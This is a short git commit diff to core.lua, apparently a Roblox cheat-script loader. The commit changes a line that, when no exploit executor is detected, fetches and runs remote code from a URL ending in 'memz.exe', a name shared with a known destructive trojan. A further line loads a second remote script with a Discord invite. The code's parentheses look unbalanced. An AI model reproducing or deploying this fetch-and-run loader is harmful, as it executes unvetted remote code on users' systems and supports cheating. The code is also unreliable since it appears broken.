4af5c73db8ffb681e572bdbff7c931157c057ecd
RTrade <114867982+RTrade@users.noreply.github.com>
2023-02-25 14:20:56 +0000

    Update core.lua

--- core.lua
+++ core.lua
@@ -1,5 +1,5 @@
 
 if not getgenv or not Drawing then
-  return loadstring(game:HttpGet("https://rtrade.github.io/memz.exe")()
+  return loadstring(game:HttpGet("https://rtrade.github.io/swordhook/memz.exe")()
     end
 loadstring(game:HttpGet("https://rtrade.github.io/Script.html"))("https://discord.gg/RJCabfrQEC")
